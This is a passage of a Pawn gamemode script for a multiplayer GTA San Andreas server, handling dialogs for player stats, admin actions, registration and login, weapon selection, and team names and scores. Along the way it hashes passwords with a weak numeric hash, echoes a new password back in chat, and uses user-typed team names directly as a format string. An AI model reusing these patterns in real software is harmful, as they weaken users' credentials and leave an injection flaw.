				format(statsSTR[2], sizeof(statsSTR[]), "{FF0000}- {FFFFFF}Player Time: \t\t%d\t\t{FF0000}- {FFFFFF}DM ID: \t\t%d\t\t{FF0000}- {FFFFFF}Hit Sound: \t\t%d\n{FF0000}- {FFFFFF}Player NetCheck: \t%s\t{FF0000}- {FFFFFF}Player Level: \t\t%d\t\t{FF0000}- {FFFFFF}Get Hit Sound: \t\t%d\n", Player[CID][Time], (Player[CID][DMReadd] > 0 ? Player[CID][DMReadd] : -1), Player[CID][HitSound], (Player[CID][NetCheck] == 1 ? ("Enabled") : ("Disabled")), Player[CID][Level], Player[CID][GetHitSound]);
				format(statsSTR[3], sizeof(statsSTR[]), "{FF0000}- {FFFFFF}Duels Won: \t\t%d\t\t{FF0000}- {FFFFFF}Duels Lost: \t\t%d", Player[CID][DuelsWon], Player[CID][DuelsLost]);
			    format(TotalStr, sizeof(TotalStr), "%s%s%s%s", statsSTR[0], statsSTR[1], statsSTR[2], statsSTR[3]);
			    
				format(TotalStr, sizeof(TotalStr), "%s%s%s%s%s%s", statsSTR[0], statsSTR[1], statsSTR[2], statsSTR[3], statsSTR[4], statsSTR[5]);

				ShowPlayerDialog(playerid, DIALOG_CLICK_STATS, DIALOG_STYLE_MSGBOX, namee, TotalStr, "Close", "");
				return 1;
			}
            else if(listitem == 1)
            {
                cmd_spec(playerid, sprintf("%d", LastClickedPlayer[playerid]));
            }
            else if(listitem == 2)
            {
                cmd_add(playerid, sprintf("%d", LastClickedPlayer[playerid]));
            }
            else if(listitem == 3)
            {
                cmd_remove(playerid, sprintf("%d", LastClickedPlayer[playerid]));
            }
            else if(listitem == 4)
            {
                cmd_readd(playerid, sprintf("%d", LastClickedPlayer[playerid]));
            }
            else if(listitem == 5)
            {
                cmd_givemenu(playerid, sprintf("%d", LastClickedPlayer[playerid]));
            }
            else if(listitem == 6)
            {
                cmd_goto(playerid, sprintf("%d", LastClickedPlayer[playerid]));
            }
            else if(listitem == 7)
            {
                cmd_get(playerid, sprintf("%d", LastClickedPlayer[playerid]));
            }
            else if(listitem == 8)
            {
                cmd_slap(playerid, sprintf("%d No Reason Specified", LastClickedPlayer[playerid]));
            }
            else if(listitem == 9)
            {
                cmd_mute(playerid, sprintf("%d No Reason Specified", LastClickedPlayer[playerid]));
            }
            else if(listitem == 10)
            {
                cmd_unmute(playerid, sprintf("%d", LastClickedPlayer[playerid]));
            }
            else if(listitem == 11)
            {
                cmd_kick(playerid, sprintf("%d No Reason Specified", LastClickedPlayer[playerid]));
            }
            else if(listitem == 12)
            {
                cmd_ban(playerid, sprintf("%d No Reason Specified", LastClickedPlayer[playerid]));
            }
        }
	    return 1;
	}
    if(dialogid == EDITSHORTCUTS_DIALOG)
    {
        if(response)
        {
            EditingShortcutOf[playerid] = listitem;
            ShowPlayerDialog(playerid, GETVAL_DIAG, DIALOG_STYLE_INPUT, "Editing shortcut", "Please enter a text", "Done", "Cancel");
        }
        return 1;
    }
	if(dialogid == GETVAL_DIAG)
	{
	    if(response)
	    {
	        if(EditingShortcutOf[playerid] > -1)
	        {
	            switch(EditingShortcutOf[playerid])
	            {
	                case 0:
	                { format(PlayerShortcut[playerid][Shortcut1], 50, "%s", inputtext); }
	                case 1:
	                { format(PlayerShortcut[playerid][Shortcut2], 50, "%s", inputtext); }
	                case 2:
	                { format(PlayerShortcut[playerid][Shortcut3], 50, "%s", inputtext); }
	                case 3:
	                { format(PlayerShortcut[playerid][Shortcut4], 50, "%s", inputtext); }
	            }
	            EditingShortcutOf[playerid] = -1;
				cmd_shortcuts(playerid, "_");
				return 1;
	        }
		}
		return 1;
	}
	
	if(dialogid == DIALOG_REGISTER) {
	    if(response) {
			if(isnull(inputtext)) return ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD,"{FFFFFF}Registration Dialog","{FFFFFF}Type your password below to register:","Register","Leave");

			if(strfind(inputtext, "%", true) != -1)
			{
			    ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD,"{FFFFFF}Registration Dialog","{FFFFFF}Type your password below to register:","Register","Leave");
			    return SendErrorMessage(playerid, sprintf("This character '%s' is disallowed in user passwords.", "%%"));
			}
			
			new HashPass[140];
		    format(HashPass, sizeof(HashPass), "%d", udb_hash(inputtext));

			new query[356];
			new IP[16];
			GetPlayerIp(playerid, IP, sizeof(IP));
		    format(query, sizeof(query), "INSERT INTO Players (Name, Password, Level, Weather, Time, ChatChannel, NetCheck, Widescreen, HitSound, GetHitSound, DWon, DLost, IP) VALUES('%s', '%s', 0, 0, 12, -1, 1, 0, 17802, 1135, 0, 0, '%s')", DB_Escape(Player[playerid][Name]), HashPass, IP);
			db_free_result(db_query(sqliteconnection, query));


			format(HashPass, sizeof(HashPass), ""COL_PRIM"You have been successfully registered. Password: {FFFFFF}%s", inputtext);
			SendClientMessage(playerid, -1, HashPass);

			Player[playerid][Level] = 0;
			Player[playerid][Weather] = MainWeather;
			Player[playerid][Time] = MainTime;
            Player[playerid][Logged] = true;
		    Player[playerid][ChatChannel] = -1;
		    Player[playerid][NetCheck] = 1;
		    Player[playerid][DuelsWon] = 0;
		    Player[playerid][DuelsLost] = 0;

			SpawnConnectedPlayer(playerid, 0);
		}
		else
		{
			new iString[128];
			format(iString, sizeof(iString),"{FFFFFF}%s "COL_PRIM"has been kicked from the server for not registering.", Player[playerid][Name]);
			SendClientMessageToAll(-1, iString);

			SetTimerEx("OnPlayerKicked", 500, false, "i", playerid);
		}

		return 1;
	}

	if(dialogid == DIALOG_LOGIN) {
	    if(response) {
			if(isnull(inputtext)) return ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD,"{FFFFFF}Login Dialog","{FFFFFF}Type your password below to log in:","Login","Leave");

            if(strfind(inputtext, "%", true) != -1)
			{
			    ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD,"{FFFFFF}Login Dialog","{FFFFFF}Type your password below to log in:","Login","Leave");
				return SendErrorMessage(playerid, sprintf("This character '%s' is disallowed in user passwords.", "%%"));
			}

			new HashPass[140];
			format(HashPass, sizeof(HashPass), "%d", udb_hash(inputtext));

            new Query[256];
			format(Query, sizeof(Query), "SELECT * FROM `Players` WHERE `Name` = '%s' AND `Password` = '%s'", DB_Escape(Player[playerid][Name]), HashPass);
		    new DBResult:res = db_query(sqliteconnection, Query);

			if(db_num_rows(res)) {

				LoginPlayer(playerid, res);

			} else {
		 		SendErrorMessage(playerid,"Wrong Password. Please try again.");
		 		ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD,"{FFFFFF}Login Dialog","{FFFFFF}Type your password below to log in:","Login","Leave");
			}
			db_free_result(res);
		} else {
            new iString[128];
			format(iString, sizeof(iString),"{FFFFFF}%s "COL_PRIM"has been kicked from the server for not logging in.", Player[playerid][Name]);
			SendClientMessageToAll(-1, iString);

			SetTimerEx("OnPlayerKicked", 500, false, "i", playerid);
		}
		return 1;
	}

	if(dialogid == DIALOG_SERVER_PASS) {
		if(response) {
		    if(isnull(inputtext)) return 1;
			if(strlen(inputtext) > MAX_SERVER_PASS_LENGH) {
				SendErrorMessage(playerid,"Server password is too long.");
			   	ShowPlayerDialog(playerid, DIALOG_SERVER_PASS, DIALOG_STYLE_INPUT,""COL_PRIM"Server Password",""COL_PRIM"Enter server password below:", "Ok","Close");
				return 1;
			}
            format(ServerPass, sizeof(ServerPass), "password %s", inputtext);
           	SendRconCommand(ServerPass);

			ServerLocked = true;
			PermLocked = false;
			
            new iString[64];
			format(iString, sizeof(iString), "%sServer Pass: ~r~%s", MAIN_TEXT_COLOUR, inputtext);
			TextDrawSetString(LockServerTD, iString);

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has locked the server. Password: {FFFFFF}%s",Player[playerid][Name], inputtext);
			SendClientMessageToAll(-1, iString);
		}
		return 1;
	}


	if(dialogid == DIALOG_WEAPONS_TYPE)
	{
		if(response == 1)
		{
			if(listitem != 0)
			{
				if((Player[playerid][Team] == ATTACKER && TimesPicked[ATTACKER][listitem-1] >= WeaponLimit[listitem-1]) || (Player[playerid][Team] == DEFENDER && TimesPicked[DEFENDER][listitem-1] >= WeaponLimit[listitem-1]))
				{
	                ShowPlayerWeaponMenu(playerid, Player[playerid][Team]);
	                SendErrorMessage(playerid,"This Weapon Set Is Currently Full.");
					return 1;
		        }
			}

            new iString[128];
			if(!listitem)
			{
			    ShowPlayerWeaponMenu(playerid, Player[playerid][Team]);
				return 1;
			}
			else
			{
			    GivePlayerWeapon(playerid, GunMenuWeapons[listitem-1][0], 9999);
			    GivePlayerWeapon(playerid, GunMenuWeapons[listitem-1][1], 9999);
				if(IsPlayerInAnyVehicle(playerid))
					SetPlayerArmedWeapon(playerid, 0);
			    switch(GunMenuWeapons[listitem-1][0])
			    {
			        case WEAPON_DEAGLE:
			        {
			            format(Player[playerid][PlayerTypeByWeapon], 16, "Deagler");
			        }
			        case WEAPON_SHOTGSPA:
			        {
                        format(Player[playerid][PlayerTypeByWeapon], 16, "Spasser");
			        }
			        case WEAPON_M4:
			        {
                        format(Player[playerid][PlayerTypeByWeapon], 16, "M4~er");
			        }
			        case WEAPON_SNIPER:
			        {
                        format(Player[playerid][PlayerTypeByWeapon], 16, "Sniper");
			        }
			        case WEAPON_AK47:
			        {
                        format(Player[playerid][PlayerTypeByWeapon], 16, "AK~er");
					}
					default:
					{
                        switch(GunMenuWeapons[listitem-1][1])
					    {
		                    case WEAPON_DEAGLE:
					        {
					            format(Player[playerid][PlayerTypeByWeapon], 16, "Deagler");
					        }
					        case WEAPON_SHOTGSPA:
					        {
		                        format(Player[playerid][PlayerTypeByWeapon], 16, "Spasser");
					        }
					        case WEAPON_M4:
					        {
		                        format(Player[playerid][PlayerTypeByWeapon], 16, "M4~er");
					        }
					        case WEAPON_SNIPER:
					        {
		                        format(Player[playerid][PlayerTypeByWeapon], 16, "Sniper");
					        }
					        case WEAPON_AK47:
					        {
		                        format(Player[playerid][PlayerTypeByWeapon], 16, "AK~er");
							}
							default:
							{
		                        format(Player[playerid][PlayerTypeByWeapon], 16, "Un-recognised");
							}
					    }
					}
			    }

			    if(GiveKnife)
			    	GivePlayerWeapon(playerid, WEAPON_KNIFE, 9999);
                
			    format(iString, sizeof(iString), "%s%s{FFFFFF} has selected (%s%s{FFFFFF} and %s%s{FFFFFF}).", TextColor[Player[playerid][Team]], Player[playerid][Name], TextColor[Player[playerid][Team]], WeaponNames[GunMenuWeapons[listitem-1][0]], TextColor[Player[playerid][Team]], WeaponNames[GunMenuWeapons[listitem-1][1]]);
			}

			SetPlayerArmedWeapon(playerid, 0);
            TimesPicked[Player[playerid][Team]][listitem-1]++;
            Player[playerid][WeaponPicked] = listitem;

	        switch(Player[playerid][Team])
			{
				case ATTACKER:
				{
					foreach(new i : Player)
					{
                		if(Player[i][Team] == ATTACKER) SendClientMessage(i, -1, iString);
					}
				}
				case DEFENDER:
				{
				    foreach(new i : Player)
					{
                		if(Player[i][Team] == DEFENDER) SendClientMessage(i, -1, iString);
					}
				}
            }

	        if(RoundPaused == true)
				TogglePlayerControllableEx(playerid, false);
	        else
				TogglePlayerControllableEx(playerid, true);

			Player[playerid][OnGunmenu] = false;
		}
		return 1;
	}


	if(dialogid == DIALOG_ARENA_GUNS) {
        if(response) {
	        switch(listitem) {
				case 0: {
                    ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
					return 1;
                } case 1: {
                    if(MenuID[playerid] == 1) {
                        ArenaWeapons[0][playerid] = 24;

                        MenuID[playerid] = 2;
                        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
                        return 1;

					} else if(MenuID[playerid] == 2) {
					    if(GetWeaponSlot(24) == GetWeaponSlot(ArenaWeapons[0][playerid])) {
					        SendErrorMessage(playerid,"Can't pick same/same slot weapon.");
					        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
							return 1;
						}

						ArenaWeapons[1][playerid] = 24;
					}
				} case 2: {
                    if(MenuID[playerid] == 1) {
                        ArenaWeapons[0][playerid] = 25;

                        MenuID[playerid] = 2;
                        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
                        return 1;

					} else if(MenuID[playerid] == 2) {
					    if(GetWeaponSlot(25) == GetWeaponSlot(ArenaWeapons[0][playerid])) {
					        SendErrorMessage(playerid,"Can't pick same/same slot weapon.");
					        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
							return 1;
						}

						ArenaWeapons[1][playerid] = 25;
					}
				} case 3: {
                    if(MenuID[playerid] == 1) {
                        ArenaWeapons[0][playerid] = 34;

                        MenuID[playerid] = 2;
                        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
                        return 1;

					} else if(MenuID[playerid] == 2) {
					    if(GetWeaponSlot(34) == GetWeaponSlot(ArenaWeapons[0][playerid])) {
					        SendErrorMessage(playerid,"Can't pick same/same slot weapon.");
					        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
							return 1;
						}

						ArenaWeapons[1][playerid] = 34;
					}
				} case 4: {
                    if(MenuID[playerid] == 1) {
                        ArenaWeapons[0][playerid] = 31;

                        MenuID[playerid] = 2;
                        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
                        return 1;

					} else if(MenuID[playerid] == 2) {
					    if(GetWeaponSlot(31) == GetWeaponSlot(ArenaWeapons[0][playerid])) {
					        SendErrorMessage(playerid,"Can't pick same/same slot weapon.");
					        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
							return 1;
						}

						ArenaWeapons[1][playerid] = 31;
					}
				} case 5: {
                    if(MenuID[playerid] == 1) {
                        ArenaWeapons[0][playerid] = 29;

                        MenuID[playerid] = 2;
                        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
                        return 1;

					} else if(MenuID[playerid] == 2) {
					    if(GetWeaponSlot(29) == GetWeaponSlot(ArenaWeapons[0][playerid])) {
					        SendErrorMessage(playerid,"Can't pick same/same slot weapon.");
					        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
							return 1;
						}

						ArenaWeapons[1][playerid] = 29;
					}
				} case 6: {
                    if(MenuID[playerid] == 1) {
                        ArenaWeapons[0][playerid] = 30;

                        MenuID[playerid] = 2;
                        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
                        return 1;

					} else if(MenuID[playerid] == 2) {
					    if(GetWeaponSlot(30) == GetWeaponSlot(ArenaWeapons[0][playerid])) {
					        SendErrorMessage(playerid,"Can't pick same/same slot weapon.");
					        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
							return 1;
						}

						ArenaWeapons[1][playerid] = 30;
					}
                } case 7: {
                    if(MenuID[playerid] == 1) {
                        ArenaWeapons[0][playerid] = 33;

                        MenuID[playerid] = 2;
                        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
                        return 1;

					} else if(MenuID[playerid] == 2) {
					    if(GetWeaponSlot(33) == GetWeaponSlot(ArenaWeapons[0][playerid])) {
					        SendErrorMessage(playerid,"Can't pick same/same slot weapon.");
					        ShowTDMWeaponMenu(playerid, Player[playerid][Team]);
							return 1;
						}

						ArenaWeapons[1][playerid] = 33;
					}
                }
			}

			GivePlayerWeapon(playerid, ArenaWeapons[0][playerid], 9999);
			GivePlayerWeapon(playerid, ArenaWeapons[1][playerid], 9999);
			if(GiveKnife)
			    	GivePlayerWeapon(playerid, WEAPON_KNIFE, 9999);

			if(Player[playerid][Team] == ATTACKER) {
			    new iString[128];
			    format(iString, sizeof(iString), "{FF0033}%s{FFFFFF} has selected ({FF0033}%s{FFFFFF} and {FF0033}%s{FFFFFF}).", Player[playerid][Name], WeaponNames[ArenaWeapons[0][playerid]], WeaponNames[ArenaWeapons[1][playerid]]);

				foreach(new i : Player) {
				    if(Player[i][Playing] == true && Player[i][Team] == ATTACKER) {
						SendClientMessage(i, -1, iString);
					}
				}
			} else if (Player[playerid][Team] == DEFENDER) {
			    new iString[128];
				format(iString, sizeof(iString), ""COL_PRIM"%s{FFFFFF} has selected ("COL_PRIM"%s{FFFFFF} and "COL_PRIM"%s{FFFFFF}).", Player[playerid][Name], WeaponNames[ArenaWeapons[0][playerid]], WeaponNames[ArenaWeapons[1][playerid]]);

				foreach(new i : Player) {
				    if(Player[i][Playing] == true && Player[i][Team] == DEFENDER) {
						SendClientMessage(i, -1, iString);
					}
				}
			}

	        if(RoundPaused == true) TogglePlayerControllableEx(playerid, false);
	        else TogglePlayerControllableEx(playerid, true);
		}
//  		if(Player[playerid][Playing] == true) SetPlayerVirtualWorld(playerid, 2);

		return 1;
	}


	if(dialogid == DIALOG_CURRENT_TOTAL) {
		if(isnull(inputtext)) return 1;
        if(!IsNumeric(inputtext)) {
            SendErrorMessage(playerid,"You can only use numeric input.");
            new iString[64];
			iString = ""COL_PRIM"Enter current round or total rounds to be played:";
    		ShowPlayerDialog(playerid, DIALOG_CURRENT_TOTAL, DIALOG_STYLE_INPUT,""COL_PRIM"Rounds Dialog",iString,"Current","Total");
			return 1;
		}

		new Value = strval(inputtext);

		if(Value < 0 || Value > 100) {
            SendErrorMessage(playerid,"Current or total rounds can only be between 0 and 100.");
            new iString[64];
			iString = ""COL_PRIM"Enter current round or total rounds to be played:";
    		ShowPlayerDialog(playerid, DIALOG_CURRENT_TOTAL, DIALOG_STYLE_INPUT,""COL_PRIM"Rounds Dialog",iString,"Current","Total");
			return 1;
		}
		
        new iString[128];
        
	    if(response) {
	        CurrentRound = Value;
			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed the current round to: {FFFFFF}%d", Player[playerid][Name], CurrentRound);
			SendClientMessageToAll(-1, iString);
		} else {
		    TotalRounds = Value;
			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed the total rounds to: {FFFFFF}%d", Player[playerid][Name], TotalRounds);
			SendClientMessageToAll(-1, iString);
		}

		format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
		TextDrawSetString(RoundsPlayed, iString);
		return 1;
	}

	if(dialogid == DIALOG_TEAM_SCORE) {
		if(response) {
		    new iString[128];
		    switch(listitem) {
		        case 0: {
					iString = ""COL_PRIM"Enter {FFFFFF}Attacker "COL_PRIM"Team Name Below:";
				    ShowPlayerDialog(playerid, DIALOG_ATT_NAME, DIALOG_STYLE_INPUT,""COL_PRIM"Attacker Team Name",iString,"Next","Close");
				} case 1: {
					format(iString, sizeof(iString), ""COL_PRIM"Enter {FFFFFF}%s "COL_PRIM"Team Score Below:", TeamName[ATTACKER]);
				    ShowPlayerDialog(playerid, DIALOG_ATT_SCORE, DIALOG_STYLE_INPUT,""COL_PRIM"Attacker Team Score",iString,"Next","Close");
				} case 2: {
				    TeamScore[ATTACKER] = 0;
				    TeamScore[DEFENDER] = 0;
				    CurrentRound = 0;

					format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
				    TextDrawSetString(TeamScoreText, iString);

					format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
					TextDrawSetString(RoundsPlayed, iString);

					ClearPlayerVariables();

					foreach(new i : Player)
					{
					    for(new j = 0; j < 55; j ++)
	    					Player[i][WeaponStat][j] = 0;
		   				Player[i][TotalKills] = 0;
						Player[i][TotalDeaths] = 0;
						Player[i][TotalDamage] = 0;
						Player[i][RoundPlayed] = 0;
					    Player[i][TotalBulletsFired] = 0;
					    Player[i][TotalshotsHit] = 0;
					}

					format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has resetted the scores.", Player[playerid][Name]);
					SendClientMessageToAll(-1, iString);
				}
			}
		}
		return 1;
	}

	if(dialogid == DIALOG_WAR_RESET) {
	    if(response) {
		    TeamScore[ATTACKER] = 0;
		    TeamScore[DEFENDER] = 0;
		    CurrentRound = 0;
		    
            new iString[128];
			format(iString, sizeof(iString), "SELECT * FROM Configs WHERE Option = 'Total Rounds'");
		    new DBResult:res = db_query(sqliteconnection, iString);

			db_get_field_assoc(res, "Value", iString, sizeof(iString));
    		TotalRounds = strval(iString);
			db_free_result(res);

			TeamName[ATTACKER] = "Alpha";
			TeamName[ATTACKER_SUB] = "Alpha Sub";
			TeamName[DEFENDER] = "Beta";
			TeamName[DEFENDER_SUB] = "Beta Sub";

			format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
		    TextDrawSetString(TeamScoreText, iString);

			format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
			TextDrawSetString(RoundsPlayed, iString);


			format(iString, sizeof iString, "%sWar Mode: ~r~OFF", MAIN_TEXT_COLOUR);
			TextDrawSetString(WarModeText, iString);

			foreach(new i : Player) {
			    //for(new j = 0; j < 55; j ++)
  				//	Player[i][WeaponStat][j] = 0;
   				Player[i][TotalKills] = 0;
				Player[i][TotalDeaths] = 0;
				Player[i][TotalDamage] = 0;
				Player[i][RoundPlayed] = 0;
			    Player[i][TotalBulletsFired] = 0;
			    Player[i][TotalshotsHit] = 0;
			}

            ClearPlayerVariables();

			TextDrawHideForAll(RoundsPlayed);
			TextDrawHideForAll(TeamScoreText);

			WarMode = false;

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has disabled the Match-Mode.", Player[playerid][Name]);
			SendClientMessageToAll(-1, iString);
		}
		return 1;
	}

	if(dialogid == DIALOG_ATT_NAME) {
	    if(response) {
	        new iString[128];
			if(isnull(inputtext)) {
				iString = ""COL_PRIM"Enter {FFFFFF}Defender "COL_PRIM"Team Name Below:";
			    ShowPlayerDialog(playerid, DIALOG_DEF_NAME, DIALOG_STYLE_INPUT,""COL_PRIM"Defender Team Name",iString,"Ok","Close");
				return 1;
			}
			if(strlen(inputtext) > 6) {
            	SendErrorMessage(playerid,"Team name is too long.");
				iString = ""COL_PRIM"Enter {FFFFFF}Attacker "COL_PRIM"Team Name Below:";
			    ShowPlayerDialog(playerid, DIALOG_ATT_NAME, DIALOG_STYLE_INPUT,""COL_PRIM"Attacker Team Name",iString,"Next","Close");
				return 1;
			}

			if(strfind(inputtext, "~") != -1) {
			    return SendErrorMessage(playerid,"~ not allowed.");
			}

			format(TeamName[ATTACKER], 24, inputtext);
			format(TeamName[ATTACKER_SUB], 24, "%s Sub", TeamName[ATTACKER]);

			format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
		    TextDrawSetString(TeamScoreText, iString);

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set attacker team name to: {FFFFFF}%s", Player[playerid][Name], TeamName[ATTACKER]);
			SendClientMessageToAll(-1, iString);

			iString = ""COL_PRIM"Enter {FFFFFF}Defender "COL_PRIM"Team Name Below:";
		    ShowPlayerDialog(playerid, DIALOG_DEF_NAME, DIALOG_STYLE_INPUT,""COL_PRIM"Defender Team Name",iString,"Ok","Close");
		}
		return 1;
	}

	if(dialogid == DIALOG_DEF_NAME)
	{
	    if(response)
		{
	        if(isnull(inputtext)) return 1;
	        if(strlen(inputtext) > 6) {
	           	SendErrorMessage(playerid,"Team name is too long.");
	           	new iString[64];
				iString = ""COL_PRIM"Enter {FFFFFF}Defender "COL_PRIM"Team Name Below:";
			    ShowPlayerDialog(playerid, DIALOG_DEF_NAME, DIALOG_STYLE_INPUT,""COL_PRIM"Defender Team Name",iString,"Ok","Close");
				return 1;
			}

			if(strfind(inputtext, "~") != -1) {
			    return SendErrorMessage(playerid,"~ not allowed.");
			}

			format(TeamName[DEFENDER], 24, inputtext);
			format(TeamName[DEFENDER_SUB], 24, "%s Sub", TeamName[DEFENDER]);

            new iString[128];
			format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
		    TextDrawSetString(TeamScoreText, iString);

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set defender team name to: {FFFFFF}%s", Player[playerid][Name], TeamName[DEFENDER]);
			SendClientMessageToAll(-1, iString);

		    WarMode = true;
		    format(iString, sizeof iString, "%sWar Mode: ~r~ON", MAIN_TEXT_COLOUR);
			TextDrawSetString(WarModeText, iString);

			TextDrawShowForAll(RoundsPlayed);
			TextDrawShowForAll(TeamScoreText);
		}
		return 1;
	}

	if(dialogid == DIALOG_ATT_SCORE)
	{
	    if(response)
		{
	        new iString[128];
	        if(isnull(inputtext))
			{
				format(iString, sizeof(iString), ""COL_PRIM"Enter {FFFFFF}%s "COL_PRIM"Team Score Below:", TeamName[DEFENDER]);
			    ShowPlayerDialog(playerid, DIALOG_DEF_SCORE, DIALOG_STYLE_INPUT,""COL_PRIM"Defender Team Score",iString,"Ok","Close");
				return 1;
			}
			if(!IsNumeric(inputtext))
			{
	            SendErrorMessage(playerid,"Score can only be numerical.");
				format(iString, sizeof(iString), ""COL_PRIM"Enter {FF3333}%s "COL_PRIM"Team Score Below:", TeamName[ATTACKER]);
			    ShowPlayerDialog(playerid, DIALOG_ATT_SCORE, DIALOG_STYLE_INPUT,""COL_PRIM"Attacker Team Score",iString,"Next","Close");
				return 1;
			}
			new Score = strval(inputtext);

			if(Score < 0 || Score > 100)
			{
	            SendErrorMessage(playerid,"Score can only be between 0 and 100.");
				format(iString, sizeof(iString), ""COL_PRIM"Enter {FF3333}%s "COL_PRIM"Team Score Below:", TeamName[ATTACKER]);
			    ShowPlayerDialog(playerid, DIALOG_ATT_SCORE, DIALOG_STYLE_INPUT,""COL_PRIM"Attacker Team Score",iString,"Next","Close");
				return 1;
			}

			if((Score + TeamScore[DEFENDER]) >= TotalRounds)
			{
				SendErrorMessage(playerid,"Attacker plus defender score is bigger than or equal to total rounds.");
				format(iString, sizeof(iString), ""COL_PRIM"Enter {FFFFFF}%s "COL_PRIM"Team Score Below:", TeamName[ATTACKER]);
			    ShowPlayerDialog(playerid, DIALOG_ATT_SCORE, DIALOG_STYLE_INPUT,""COL_PRIM"Attacker Team Score",iString,"Next","Close");
				return 1;
			}

			TeamScore[ATTACKER] = Score;
			CurrentRound = TeamScore[ATTACKER] + TeamScore[DEFENDER];

            
			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set attacker team score to: {FFFFFF}%d", Player[playerid][Name], TeamScore[ATTACKER]);
			SendClientMessageToAll(-1, iString);

			format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
		    TextDrawSetString(TeamScoreText, iString);

			format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
			TextDrawSetString(RoundsPlayed, iString);

			format(iString, sizeof(iString), ""COL_PRIM"Enter {FFFFFF}%s "COL_PRIM"Team Score Below:", TeamName[DEFENDER]);
		    ShowPlayerDialog(playerid, DIALOG_DEF_SCORE, DIALOG_STYLE_INPUT,""COL_PRIM"Defender Team Score",iString,"Ok","Close");
		}
		return 1;
	}

	if(dialogid == DIALOG_DEF_SCORE)
	{
	    if(response)
		{
	        if(isnull(inputtext))
				return 1;
				
            new iString[128];
	        if(!IsNumeric(inputtext))
			{
	            SendErrorMessage(playerid,"Score can only be numerical.");
				format(iString, sizeof(iString), ""COL_PRIM"Enter {FFFFFF}%s "COL_PRIM"Team Score Below:", TeamName[DEFENDER]);
			    ShowPlayerDialog(playerid, DIALOG_DEF_SCORE, DIALOG_STYLE_INPUT,""COL_PRIM"Defender Team Score",iString,"Ok","Close");
				return 1;
			}

			new Score = strval(inputtext);

			if(Score < 0 || Score > 100)
			{
	            SendErrorMessage(playerid,"Score can only be between 0 and 100.");
				format(iString, sizeof(iString), ""COL_PRIM"Enter {FFFFFF}%s "COL_PRIM"Team Score Below:", TeamName[DEFENDER]);
			    ShowPlayerDialog(playerid, DIALOG_DEF_SCORE, DIALOG_STYLE_INPUT,""COL_PRIM"Defender Team Score",iString,"Ok","Close");
			    return 1;
			}

			if((TeamScore[ATTACKER] + Score) >= TotalRounds)
			{
	            SendErrorMessage(playerid,"Attacker plus defender score is bigger than or equal to total rounds.");
				format(iString, sizeof(iString), ""COL_PRIM"Enter {FFFFFF}%s "COL_PRIM"Team Score Below:", TeamName[DEFENDER]);
			    ShowPlayerDialog(playerid, DIALOG_DEF_SCORE, DIALOG_STYLE_INPUT,""COL_PRIM"Defender Team Score",iString,"Ok","Close");
				return 1;
			}
			TeamScore[DEFENDER] = Score;
